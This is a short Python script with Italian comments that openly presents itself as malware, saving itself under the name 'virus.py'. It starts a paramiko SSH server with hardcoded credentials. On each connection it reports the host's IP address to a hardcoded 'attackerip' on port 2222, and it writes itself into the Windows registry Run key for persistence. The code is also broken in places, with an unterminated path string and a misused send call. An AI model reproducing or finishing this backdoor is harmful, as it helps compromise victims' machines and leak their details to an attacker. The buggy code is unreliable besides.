import paramiko
import socket
import winreg
import os

# Crea l'oggetto di tipo Server
server = paramiko.ServerInterface()
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
ip_address = socket.gethostbyname(socket.gethostname())

# Implementa i metodi richiesti dall'interfaccia ServerInterface
class MySSHServer(paramiko.ServerInterface):
    def check_channel_request(self, kind, chanid):
        if kind == 'session':
            return paramiko.OPEN_SUCCEEDED
        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED

    def check_auth_password(self, username, password):
        if (username == 'myusername') and (password == 'mypassword'):
            return paramiko.AUTH_SUCCESSFUL
        return paramiko.AUTH_FAILED

# Crea l'oggetto Transport
transport = paramiko.Transport(('0.0.0.0', 22))
transport.add_server_key(paramiko.RSAKey.generate(2048))

# Associa il server all'oggetto Transport
transport.start_server(server=MySSHServer())

# Accetta le connessioni in entrata
while True:
    channel = transport.accept(1)
    if channel is None:
        continue
    channel.close()
    attackerip = "192.168.1.120"
    s.connect((attackerip, 2222))
    s.send(ip_address).encode
    


# nome del file da cercare
filename = "virus.py"

# percorso della radice del disco C:
root_folder = r"C:\Users\Downloads\
    
for root, dirs, files in os.walk(root_folder):
    if filename in files:
        file_path = os.path.join(root, filename)
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "virus.py", 0, winreg.REG_SZ, os.path.abspath(file_path))
        winreg.CloseKey(key)
        break
else:
    print("Il file non è stato trovato.")